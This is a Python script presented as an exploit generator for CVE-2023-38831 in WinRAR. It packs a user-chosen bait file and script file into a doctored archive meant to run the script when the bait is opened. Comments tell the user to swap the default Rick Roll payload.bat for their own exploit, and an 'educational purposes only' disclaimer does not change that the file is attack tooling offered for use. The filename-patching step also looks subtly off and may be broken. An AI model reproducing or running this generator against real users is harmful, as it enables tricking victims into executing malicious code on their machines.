# Make sure you edit the payload.bat file with your exploit. It is defaulted to Rick Roll the victim. 
#Use this for educational purposes only. Do not use this piece of code for any unethical or unintended behaviour. 
#Author is not responsible for any actions made using this code 

import shutil
import os

def exploit():
    print("---------------------------------")
    print("CVE-2023-38831 Exploit Generator")
    print("               POC by TheGr1ffyn")
    print("---------------------------------")

    bait_file = input("Enter the name of the bait file: ")
    script_file = input("Enter the name of the script file: ")
    output_file = input("Enter the desired output RAR file name: ")

    files_to_copy = [bait_file, script_file]

    for file_name in files_to_copy:
        if not os.path.exists(file_name):
            print(f"Error: '{file_name}' does not exist.")
            return

    if not output_file.endswith(".rar"):
        output_file += ".rar"

    template = "tmp"
    if os.path.exists(template):
        shutil.rmtree(template)
    os.mkdir(template)

    for file_name in files_to_copy:
        shutil.copy(file_name, os.path.join(template, file_name))

    shutil.make_archive(template, 'zip', template)
    with open(template + ".zip", "rb") as f:
        content = f.read()
        for file_name in files_to_copy:
            content = content.replace(file_name.encode(), b" ")
    os.remove(template + ".zip")

    with open(output_file, "wb") as f:
        f.write(content)

    print(f"Exploit generated successfully as '{output_file}'.")
    print("Remember to use this responsibly and ethically.")

if __name__ == "__main__":
    exploit()
